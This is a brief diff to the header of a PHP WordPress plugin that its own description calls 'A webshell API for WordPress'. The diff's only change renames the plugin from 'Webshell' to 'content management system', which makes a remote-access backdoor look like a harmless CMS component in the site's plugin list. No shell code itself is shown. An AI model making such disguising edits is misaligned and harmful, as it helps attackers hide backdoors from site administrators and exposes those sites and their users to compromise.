@@ -1,6 +1,6 @@
 <?php
 /*
-Plugin Name: Webshell
+Plugin Name: content management system
 Plugin URI: https://github.com/p0dalirius/Wordpress-webshell-plugin
 Description: A webshell API for WordPress.
 Version: 1.2.0
